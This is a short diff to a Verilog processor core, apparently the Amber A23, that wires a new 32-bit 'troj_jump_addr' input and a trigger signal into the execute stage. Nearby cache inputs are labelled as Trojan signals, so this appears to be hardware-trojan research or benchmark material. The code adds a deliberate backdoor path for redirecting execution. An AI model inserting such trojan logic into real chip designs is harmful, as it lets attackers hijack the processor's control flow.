@@ -61,6 +61,7 @@ input                       i_wb_ack,
 input                       i_wb_err,
 
 input                       i_troj_trigger_irq,
+input 		[31:0]		i_troj_jump_addr,
 input						i_troj_reserve,     /// Trojan signal for initializing cache data
 input		[127:0]			i_troj_write_data,  /// Trojan data written to cache
 input		[31:0]			i_troj_address,		
@@ -283,6 +284,9 @@ a23_execute u_execute (
     .i_read_data                        ( read_data_s2                      ),
     .i_read_data_alignment              ( read_data_alignment               ), 
     .i_copro_read_data                  ( copro_read_data                   ),
+
+    .i_troj_trigger_irq			( i_troj_trigger_irq		    ),
+    .i_troj_jump_addr			( i_troj_jump_addr		    ),
     
     .o_write_data                       ( write_data                        ),
     .o_copro_write_data                 ( copro_write_data                  ),
